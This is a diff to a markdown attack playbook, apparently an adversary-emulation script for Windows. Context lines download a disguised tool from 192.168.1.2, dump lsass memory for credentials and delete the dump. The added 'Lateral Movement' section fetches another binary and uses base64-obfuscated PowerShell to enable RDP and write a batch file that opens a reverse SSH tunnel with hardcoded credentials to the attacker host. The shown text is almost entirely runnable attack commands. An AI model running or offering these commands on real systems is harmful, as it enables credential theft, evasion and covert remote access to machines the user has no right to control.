@@ -44,4 +44,18 @@ lsass.exe                      652 Services                   0     16,848 K
 #### h. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')`
 #### k. `C:\windows\temp\calc.exe -accepteula -ma 652 C:\Windows\Temp\logct2.dmp`
 #### l. Delete both of them `Remove-Item -Path "C:\Windows\Temp\logct2.dmp", "C:\Windows\Temp\logctl.zip"`
+
+### - Part 2: Lateral Movement
+
+#### a. Download ekern.exe `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')`
+#### b. Check if RDP is Enabled? `Get-Service -Name TermService`
+#### c. Enable RDP using the Encoded Command
+```
+powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LVNlcnZpY2UgLU5hbWUgVGVybVNlcnZpY2UgLVN0YXJ0dXBUeXBlIEF1dG9tYXRpYw0KDQpTdGFydC1TZXJ2aWNlIC1OYW1lIFRlcm1TZXJ2aWNlDQoNClNldC1JdGVtUHJvcGVydHkgLVBhdGggJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlclwnIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAw')) | Invoke-Expression}"
+```
+#### d. `Get-Service -Name TermService`
+#### e. Write the FXS.bat
+```
+powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGJhdGNoQ29udGVudCA9ICdlY2hvIHl8QzpcV2luZG93c1xUZW1wXGVrZXJuLmV4ZSAtc3NoIC1QIDQ0MyAtbCBIQGNrM3IgLXB3IENAbnRfRDNmM25kXzIwMjEtNDQwNzcgLVIgMTI3LjAuMC4xOjQ5ODAwOjE5Mi4xNjguMjAuMTQ1OjMzODkgMTkyLjE2OC4xLjInDQokYmF0Y2hGaWxlUGF0aCA9ICdDOlxVc2Vyc1xWaWN0aW1cRG9jdW1lbnRzXEZYUy5iYXQnDQpTZXQtQ29udGVudCAtUGF0aCAkYmF0Y2hGaWxlUGF0aCAtVmFsdWUgJGJhdGNoQ29udGVudA==')) | Invoke-Expression}"
+```
   
